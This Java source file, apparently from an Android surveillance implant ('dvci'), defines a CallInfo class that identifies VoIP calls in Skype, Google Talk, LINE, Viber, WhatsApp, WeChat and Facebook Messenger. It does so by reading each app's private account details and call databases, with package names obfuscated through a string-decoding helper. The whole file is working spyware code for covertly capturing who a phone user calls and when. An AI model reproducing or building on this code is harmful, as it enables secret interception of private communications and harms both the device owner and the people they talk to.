package com.android.dvci.module.call;

import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.module.chat.ChatFacebook;
import com.android.dvci.module.chat.ChatGoogle;
import com.android.dvci.module.chat.ChatLine;
import com.android.dvci.module.chat.ChatSkype;
import com.android.dvci.module.chat.ChatViber;
import com.android.dvci.module.chat.ChatWeChat;
import com.android.dvci.module.chat.ChatWhatsapp;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

import java.util.Date;

public class CallInfo {
	private static final String TAG = "CallInfo";
	public static final int PRG_SKYPE_ID = 0x0146;
	public static final int PRG_GTALK_ID = 0x0142;
	public static final int PRG_LINE_ID = 0x014a;
	public static final int PRG_VIBER_ID = 0x0148;
	public static final int PRG_WHATSAPP_ID = 0x014b;
	public static final int PRG_WECHAT_ID = 0x0149;
	public static final int PRG_FB_ID = 0x014c;

	public int id;
	public String account;
	public String peer;
	public String displayName;
	public boolean incoming;
	public boolean valid;
	public String processName;
	public int programId;
	public Date timestamp;
	public boolean delay;
	public boolean realRate;
	private long[] streamId = new long[2];
	public Date begin;
	public Date end;
	public boolean micStopped =false;

	public CallInfo(boolean micStopped) {
		this.micStopped = micStopped;
	}

	public boolean isMicStopped() {
		return micStopped;
	}

	public void setMicStopped(boolean micStopped) {
		this.micStopped = micStopped;
	}

	public String getCaller() {
		if (!incoming) {
			return account;
		}
		return peer;
	}

	public String getCallee() {
		if (incoming) {
			return account;
		}
		return peer;
	}

	public long getStreamId(boolean remote) {
		int pos = remote ? 1 : 0;
		return this.streamId[pos];
	}

	public boolean setStreamId(boolean remote, long streamId) {

		int pos = remote ? 1 : 0;
		if (streamId != this.streamId[pos]) {

			if (this.streamId[pos] != 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStreamId): Wrong streamId: " + this.streamId[pos] + " <- " + streamId + " "
							+ (remote ? "remote" : "local"));
				}
				this.streamId[pos] = streamId;
				return false;
			}

			this.streamId[pos] = streamId;
		}

		return true;
	}

	public boolean setStreamPid(int pid) {

		if (pid != this.programId) {

			if (this.programId != 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (setStreamPid): Wrong pid: " + this.programId + " <- " + pid);
				}
				this.programId = pid;
				return false;
			}

			this.programId = pid;

		}

		return true;
	}

	public boolean update(boolean end) {

		// RunningAppProcessInfo fore = runningProcesses.getForeground_wrapper();
		if (this.valid) {
			return true;
		}

		if (Cfg.DEBUG) {
			Check.asserts(this.programId!=0, "ProgramId should never be zero");
			Check.log(TAG + " (update), programId: " + this.programId);
		}

		if (!this.incoming && this.programId == 0 && end) {
			// HACK: fix this thing.
			// the last local viber chunk has pid 0, we fix it here

			this.programId = 0x0148;
		}

		if (this.programId == PRG_SKYPE_ID) {

			if (end) {
				return true;
			}
			this.processName = M.e("com.skype.raider");
			// open DB
			String account = ChatSkype.readAccount();
			this.account = account;
			this.delay = false;
			this.realRate = false;

			if(account == null){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (update) ERROR, cannot read Skype account ");
					return false;
				}
			}
			boolean ret = false;
			// todo: togliere l'helper, includerlo in ChatSkype.getAccount
			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);

			if (helper != null) {
				ret = ChatSkype.getCurrentCall(helper, this);
				if (Cfg.DEBUG) {
					Check.log(TAG + " SKYPE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
				}
				helper.disposeDb();
			}

			return ret;

		} else if (this.programId == PRG_GTALK_ID) {

			boolean ret = false;
			this.processName = M.e("com.google.android.talk");
			this.delay = true;
			this.realRate = true;

			// open DB
			if (end) {
				ret = ChatGoogle.getCurrentCall(this);
				this.account = ChatGoogle.getOwner(-1).getPhone();
			} else {
				this.account = M.e("delay");
				this.peer = M.e("delay");
				ret = true;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " gtalk (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
			}
			return ret;

		} else if (this.programId == PRG_LINE_ID) {
			boolean ret = false;
			this.processName = M.e("jp.naver.line.android");
			this.delay = true;
			this.realRate = true;

			// open DB
			if (end) {

				String account = ChatLine.getAccount();
				if(account.equals("") ){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (updateCallInfo) failed to get account for line ");
					}
				}
				this.account = account;

				ret = ChatLine.getCurrentCall(this);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateCallInfo) id: " + this.id);
				}
			} else {
				this.account = M.e("delay");
				this.peer = M.e("delay");
				ret = true;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " LINE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
			}
			return ret;

		} else if (this.programId == PRG_VIBER_ID) {
			boolean ret = false;
			this.processName = M.e("com.viber.voip");
			this.delay = true;
			this.realRate = true;

			// open DB
			if (end) {
				String account = ChatViber.readAccount();
				this.account = account;
				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();

				if (helper != null) {
					ret = ChatViber.getCurrentCall(helper, this);
					helper.disposeDb();
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateCallInfo) id: " + this.id);
				}
			} else {
				this.account = M.e("delay");
				this.peer = M.e("delay");
				ret = true;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " VIBER (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
			}

			return ret;

		} else if (this.programId == PRG_WHATSAPP_ID) {
			if (end) {
				return true;
			}
			this.processName = M.e("com.whatsapp");
			// open DB
			String account = ChatWhatsapp.readMyPhoneNumber();
			this.account = account;
			this.delay = false;
			this.realRate = true;

			if(account == null){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (update) ERROR, cannot read whatsapp account ");
					return false;
				}
			}
			boolean ret = false;
				ret = ChatWhatsapp.getCurrentCall(this);
				if (Cfg.DEBUG) {
					Check.log(TAG + " WHATSAPP (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
				}

			return ret;
		}else if (this.programId == PRG_WECHAT_ID) {
			if (end) {
				return true;
			}
			this.processName = M.e("com.tencent.mm");
			// open DB
			String account = ChatWeChat.readMyPhoneNumber();
			this.account = account;
			this.delay = false;
			this.realRate = true;

			if(account == null){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (update) ERROR, cannot read wechat account ");
					return false;
				}
			}
			boolean ret = false;
			ret = ChatWeChat.getCurrentCall(this);
			if (Cfg.DEBUG) {
				Check.log(TAG + " WECHAT (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
			}

			return ret;
		}else if (this.programId == PRG_FB_ID) {

			boolean ret = false;
			this.processName = M.e("com.facebook.orca");
			this.delay = true;
			this.realRate = true;
			if (end) {

				// open DB

				String account = ChatFacebook.getPhone_number();
				if (StringUtils.isEmpty(account)) {
					ChatFacebook.getAccountInfo();
					account = ChatFacebook.getPhone_number();
					if (StringUtils.isEmpty(account)) {
						account = "fb local";
					}
				}
				this.account = account;
				if (account == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (update) ERROR, cannot read whatsapp account ");
						return false;
					}
				}

				ret = ChatFacebook.getCurrentCall(this);


			} else {
				this.account = M.e("delay");
				this.peer = M.e("delay");
				ret = true;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " FACEBOOK (updateCallInfo): id: " + this.id + " peer: " + this.peer + " incoming=" + this.incoming + " returning:" + ret);
			}

			return ret;
		}
		return false;
	}

}
